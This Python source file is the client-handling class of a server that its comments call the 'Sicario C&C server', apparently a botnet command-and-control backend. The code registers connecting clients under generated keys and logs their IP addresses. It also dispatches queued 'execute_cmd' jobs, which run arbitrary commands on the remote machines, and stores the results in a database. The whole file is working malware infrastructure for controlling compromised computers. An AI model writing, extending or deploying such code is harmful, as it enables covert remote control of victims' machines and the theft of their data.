#!/usr/bin/python

import sicario 
import commands
import log
import database

# Sicario C&C server
# High level client class

import time,hashlib

class Client:
	def __init__ (self, address, socket):
		self.address = address
		self.socket = socket
		self.pending_job = False
		self.key = False
	
	def on_command (self, command):

		if self.pending_job: # server is currently waiting for the results of sent command
			response = command
			db = database.Database({'filename':'db/sicario.db'})
			db.cursor.execute('''UPDATE jobs SET processed = 1, result = ?, executed_on = datetime('now') WHERE id = ?''', [command, self.pending_job])
			db.handler.commit()
			db.handler.close()

			log.log('{} (key {}) successfully executed job #{}!'.format(self.address, self.key, self.pending_job))
			self.pending_job = False

			self.__check_jobs()
			return True

		
		# arguments[0] is the command name
		arguments = commands.parse(command)
		
		if self.key == False and arguments[0] != 'register' and arguments[0] != 'login':
			self.disconnect()
			return False

		db = database.Database({'filename':'db/sicario.db'})
		
		if not self.key:
			# is it new member? let's check if he provided his key
			if len(arguments) < 2:
				# new member
				log.log('Got new member! ({}). Generating random key..'.format(self.address))
				key = hashlib.md5(str(time.time()*100000)).hexdigest().upper()
				log.log('Key for {} generated: {}'.format(self.address, key))
				self.send_command(['set','key',key])
				
				# now, we should add this to a database
				db.cursor.execute('''INSERT INTO clients (hash, ip, last_active) VALUES (?,?,datetime('now', 'localtime'))''', [key, self.address])

				db.handler.commit()
				db.handler.close()

				self.disconnect()

			elif len(arguments) == 2 and len(arguments[1]) == 32:
				# already registered member
				self.key = arguments[1]

				# first we check if our client is registered in the database, if not - we inform him about it
				db.cursor.execute('SELECT * FROM clients WHERE hash=?', [self.key])
				client = db.cursor.fetchone()

				if not client:
					self.send_command(['error', '1'])
					db.handler.close()
					self.disconnect()

				db.cursor.execute('''UPDATE clients SET last_active = datetime('now', 'localtime'), ip = ? WHERE hash=?''', [self.address, self.key])

				# now we're going to check for pending commands (jobs)
				jobs = self.__check_jobs()

				if jobs:
					log.log('{} (key {}) updated himself successfully [{} jobs pending]'.format(self.address, self.key, len(jobs)))
				else:
					log.log('{} (key {}) updated himself successfully [0 jobs pending].'.format(self.address, self.key))
					self.disconnect()


	
	def send_command (self, args):
		self.raw_send(commands.encode(args))
	
	def raw_send (self, text):
		self.socket.send(text)
		
	def __check_jobs (self):
		if not self.key:
			return False

		db = database.Database({'filename':'db/sicario.db'})
		db.cursor.execute('''SELECT * FROM jobs WHERE client_key = ? AND processed = 0''', [self.key])
		jobs = db.cursor.fetchall()

		if not jobs:
			return False

		if jobs[0][2] == 'execute_cmd': # type
			self.send_command(['execute', jobs[0][4]]) #payload
			self.pending_job = jobs[0][0] #id

		return jobs



	def disconnect (self):
		self.socket.stop()
		return True